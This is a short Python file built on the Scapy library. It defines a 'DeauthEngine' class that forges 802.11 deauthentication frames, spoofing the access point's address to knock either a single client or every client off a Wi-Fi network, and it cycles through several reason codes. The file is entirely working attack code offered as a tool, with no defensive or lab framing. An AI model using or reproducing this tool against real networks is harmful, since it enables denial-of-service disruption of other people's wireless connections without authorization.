from scapy.all import *

class DeauthEngine:
    def __init__(self, interface):
        self.interface = interface

    def send_deauth(self, target_mac, bssid, count=None, inter=0.05, reason=7):
        """
        Sends Deauthentication frames.
        bssid: MAC address of the Access Point
        target_mac: MAC address of the Client (or 'ff:ff:ff:ff:ff:ff' for broadcast)
        """
        dot11 = Dot11(addr1=target_mac, addr2=bssid, addr3=bssid)
        packet = RadioTap()/dot11/Dot11Deauth(reason=reason)
        
        if count:
            sendp(packet, iface=self.interface, count=count, inter=inter, verbose=False)
        else:
            # We will handle looping in the attack methods for more control
            sendp(packet, iface=self.interface, count=1, verbose=False)

    def attack_bssid(self, bssid, reasons=[1, 4, 7, 9]):
        """Broadcast deauth to all clients on a BSSID with multiple reason codes."""
        for r in reasons:
            self.send_deauth("ff:ff:ff:ff:ff:ff", bssid, reason=r)

    def attack_client(self, bssid, client_mac, reasons=[1, 4, 7, 9]):
        """Targeted deauth for a specific client with multiple reason codes."""
        for r in reasons:
            self.send_deauth(client_mac, bssid, reason=r)
